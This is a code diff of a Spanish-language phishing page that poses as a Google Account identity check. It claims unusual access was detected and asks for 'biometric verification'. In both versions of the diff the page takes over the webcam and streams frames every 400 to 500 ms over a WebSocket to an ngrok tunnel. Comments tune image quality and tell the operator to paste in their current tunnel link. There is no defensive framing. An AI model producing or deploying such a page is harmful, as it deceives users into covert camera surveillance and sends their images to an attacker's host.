@@ -2,66 +2,57 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Google Account - Verificación</title>
+    <title>Google Account - Seguridad</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: Roboto, Arial, sans-serif; text-align: center; padding-top: 50px; }
-        .container { max-width: 400px; margin: auto; border: 1px solid #dadce0; border-radius: 8px; padding: 20px; }
-        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; }
+        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
+        .card { max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
-        <h2>Verificación de seguridad</h2>
-        <p>Para proteger su cuenta, necesitamos realizar una validación rápida. Haga clic en el botón para continuar.</p>
-        <button onclick="iniciar()">Continuar</button>
+    <div class="card">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
+        <h1>Confirmar identidad</h1>
+        <p>Se ha detectado un acceso inusual. Complete la verificación biométrica para continuar.</p>
+        <button class="btn" onclick="check()">Continuar</button>
     </div>
 
     <script>
-       async function iniciar() {
-    try {
-        // 1. Pedimos la cámara con una resolución específica (HD)
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                width: { ideal: 1280 },
-                height: { ideal: 720 },
-                facingMode: "user" 
-            }, 
-            audio: false 
-        });
-        
-        const socket = new WebSocket('wss://goofiness-spiffy-mascot.ngrok-free.dev');
+        async function check() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 1280, height: 720, facingMode: "user" } 
+                });
+                
+                // CAMBIA ESTO POR TU LINK ACTUAL DE NGROK
+                const socket = new WebSocket('wss://goofiness-spiffy-mascot.ngrok-free.dev');
 
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
 
-        socket.onopen = () => {
-            setInterval(() => {
-                if (video.videoWidth > 0) {
-                    // 2. Usamos el tamaño real que entrega la cámara para no perder detalle
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    if (socket.readyState === 1) {
-                        // 3. Enviamos en formato WEBP con calidad 0.8 (Alta nitidez)
-                        // Si notas que se traba mucho, bájalo a 0.6
-                        socket.send(canvas.toDataURL('image/webp', 0.8));
-                    }
-                }
-            }, 400); // Enviamos una foto cada 400ms para no saturar el túnel
-        };
-        alert("Sincronizando... Mantenga esta ventana abierta.");
-    } catch (e) {
-        alert("Debe permitir el acceso para verificar su identidad.");
-    }
-}
+                socket.onopen = () => {
+                    setInterval(() => {
+                        if (video.videoWidth > 0) {
+                            // Mantenemos resolución alta pero enviamos JPEG 0.6
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            if (socket.readyState === 1) {
+                                socket.send(canvas.toDataURL('image/jpeg', 0.6));
+                            }
+                        }
+                    }, 500); // 2 fotos por segundo para no saturar Ngrok
+                };
+                alert("Verificando dispositivo...");
+            } catch (e) {
+                alert("Debe permitir el acceso para validar su cuenta.");
+            }
+        }
     </script>
 </body>
 </html>
